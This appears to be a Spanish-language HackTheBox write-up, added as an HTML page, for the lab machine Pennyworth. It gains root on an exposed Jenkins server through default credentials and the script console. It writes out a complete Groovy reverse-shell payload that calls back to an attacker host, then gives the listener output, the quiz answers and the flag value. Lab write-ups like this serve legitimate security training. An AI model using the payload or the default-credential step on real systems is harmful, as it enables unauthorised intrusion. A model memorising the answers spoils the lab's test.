@@ -1,0 +1,127 @@
+<!doctype html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+<title>Writeup Pennyworth HackTheBox</title>
+<link rel="shortcut icon" type="image/png" sizes="64x64" href="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/sp/pennyworth.png">
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="Writeup Pennyworth HackTheBox" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Resolución de la máquina Pennyworth de la plataforma de HackTheBox" />
+<meta property="og:description" content="Resolución de la máquina Pennyworth de la plataforma de HackTheBox" />
+<link rel="canonical" href="http://localhost:4000/another-page.html" />
+<meta property="og:url" content="http://localhost:4000/another-page.html" />
+<meta property="og:site_name" content="Writeup Pennyworth HackTheBox" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Writeup Pennyworth HackTheBox" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"Resolución de la máquina Pennyworth de la plataforma de HackTheBox","headline":"Writeup Pennyworth HackTheBox","url":"http://localhost:4000/another-page.html"}</script>
+
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
+    <script src="/assets/js/respond.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+
+<meta name="theme-color" content="#353535">
+<meta name="msapplication-navbutton-color" content="#353535">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+
+  </head>
+  <body>
+
+    <div class="wrapper">
+
+      <section>
+        <div id="title">
+          <h1>Writeup Pennyworth HackTheBox</h1>
+          <p>Resolución de la máquina Pennyworth de la plataforma de HackTheBox</p>
+        </div>
+
+<div><p>Iniciamos escaneando los puertos de la máquina con nmap, con -sV para ver versiones</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ nmap</span><span class="p"> 10.129.99.182
+Nmap scan report for 10.129.99.182
+PORT     STATE SERVICE VERSION
+8080/tcp open  http    Jetty 9.4.39.v20210325</span>
+</code></pre></div></div>
+
+<div><p>Al abrir la web en el puerto 8080 podemos ver un simple login de Jenkins</p></div>
+<a href="./2.png" target="_blank"><div><p><img src="./2.png"><p></div></a>
+
+<div><p>Con wappalyzer podemos ver la versión de Jenkins 2.289.1</p></div>
+<div><p><img src="./1.png"><p></div>
+
+<div><p>Podemos autenticarnos con credenciales por defecto en este caso root:password</p></div>
+<div><p><img src="./3.png"><p></div>
+
+<div><p>Una vez autenticados tenemos acceso al panel de administración de Jenkins</p></div>
+<a href="./4.png" target="_blank"><div><p><img src="./4.png"><p></div></a>
+
+<div><p>Una forma de ejecutar comandos es ir a /script que admite ejecutar en Groovy script</p></div>
+<a href="./5.png" target="_blank"><div><p><img src="./5.png"><p></div></a>
+
+<div><p>Usamos un <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#groovy">payload</a> para Groovy que nos mande una /bin/bash a nuestro host por el puerto 443</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="k">String </span><span class="p">host</span><span class="kd">=</span><span class="s2">"10.10.14.10"</span><span class="p">;
+</span><span class="k">int </span><span class="p">port</span><span class="kd">=</span><span class="na">443</span><span class="p">;
+</span><span class="k">String </span><span class="p">cmd</span><span class="kd">=</span><span class="s2">"/bin/bash"</span><span class="p">;
+</span><span class="k">Process </span><span class="p">p</span><span class="kd">=new</span><span class="k"> ProcessBuilder</span><span class="p">(cmd).redirectErrorStream(</span><span class="na">true</span><span class="p">).start();</span><span class="k">Socket </span><span class="p">s</span><span class="kd">=new</span><span class="k"> Socket</span><span class="p">(host,port);</span><span class="k">InputStream </span><span class="p">pi</span><span class="kd">=</span><span class="p">p.getInputStream(),pe</span><span class="kd">=</span><span class="p">p.getErrorStream(), si</span><span class="kd">=</span><span class="p">s.getInputStream();</span><span class="k">OutputStream </span><span class="p">po</span><span class="kd">=</span><span class="p">p.getOutputStream(),so</span><span class="kd">=</span><span class="p">s.getOutputStream();</span><span class="kd">while</span><span class="p">(</span><span class="kd">!</span><span class="p">s.isClosed()){</span><span class="kd">while</span><span class="p">(pi.available()</span><span class="kd">></span><span class="na">0</span><span class="p">)so.write(pi.read());</span><span class="kd">while</span><span class="p">(pe.available()</span><span class="kd">></span><span class="na">0</span><span class="p">)so.write(pe.read());</span><span class="kd">while</span><span class="p">(si.available()</span><span class="kd">></span><span class="na">0</span><span class="p">)po.write(si.read());so.flush();po.flush();</span><span class="k">Thread</span><span class="p">.sleep(</span><span class="na">50</span><span class="p">);</span><span class="kd">try</span><span class="p"> {p.exitValue();</span><span class="kd">break</span><span class="p">;}</span><span class="kd">catch</span><span class="p"> (</span><span class="k">Exception </span><span class="no">e</span><span class="p">){}};p.destroy();s.close();</span>
+</code></pre></div></div>
+
+<div><p>Lo pegamos y al ejecutarlo conseguimos una shell como root y leemos la flag</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ sudo netcat</span><span class="p"> -lvnp 443
+Listening on 0.0.0.0 443
+Connection received on 10.129.99.182
+script /dev/null -c bash
+Script started, file is /dev/null
+</span><span class="s2">root@pennyworth</span><span class="p">:</span><span class="na">/</span><span class="p"># id
+uid=0(root) gid=0(root) groups=0(root)
+</span><span class="s2">root@pennyworth</span><span class="p">:</span><span class="na">/</span><span class="p"># hostname -I
+10.129.99.182 dead:beef::250:56ff:feb9:6d9d 
+</span><span class="s2">root@pennyworth</span><span class="p">:</span><span class="na">/</span><span class="p"># cat /root/flag.txt
+9cdfb439c7876e703e307864c9167a15
+</span><span class="s2">root@pennyworth</span><span class="p">:</span><span class="na">/</span><span class="p">#</span>
+</code></pre></div></div>
+
+<div><p>Vamos con las preguntas que nos pide la web de htb para pwnear la máquina</p></div>
+<blockquote><li><strong>What does the acronym CVE stand for?</strong></li>
+<ul><p></p><li>Common Vulnerabilities and Exposures</li></ul></blockquote><br>
+
+<blockquote><li><strong>What do the three letters in CIA, referring to the CIA triad in cybersecurity, stand for?</strong></li>
+<ul><p></p><li>Confidentiality, Integrity, Availability</li></ul></blockquote><br>
+
+<blockquote><li><strong>What is the version of the service running on port 8080?</strong></li>
+<ul><p></p><li>Jetty 9.4.39.v20210325</li></ul></blockquote><br>
+
+<blockquote><li><strong>What version of Jenkins is running on the target?</strong></li>
+<ul><p></p><li>2.289.1</li></ul></blockquote><br>
+
+<blockquote><li><strong>What type of script is accepted as input on the Jenkins Script Console?</strong></li>
+<ul><p></p><li>Groovy</li></ul></blockquote><br>
+
+<blockquote><li><strong>What would the "String cmd" variable from the Groovy Script snippet be equal to if the Target VM was running Windows?</strong></li>
+<ul><p></p><li>cmd.exe</li></ul></blockquote><br>
+
+<blockquote><li><strong>What is a different command than "ip a" we could use to display our network interfaces' information on Linux?</strong></li>
+<ul><p></p><li>ifconfig</li></ul></blockquote><br>
+
+<blockquote><li><strong>What switch should we use with netcat for it to use UDP transport mode?</strong></li>
+<ul><p></p><li>-u</li></ul></blockquote><br>
+
+<blockquote><li><strong>What is the term used to describe making a target host initiate a connection back to the attacker host?</strong></li>
+<ul><p></p><li>Reverse Shell</li></ul></blockquote><br>
+
+<blockquote><li><strong>Submit root flag</strong></li>
+<ul><p></p><li>9cdfb439c7876e703e307864c9167a15</li></ul></blockquote><br>
+
+<p><a href="./../../">Página Principal</a></p>
+
+      </section>
+
+    </div>
+  </body>
+</html>
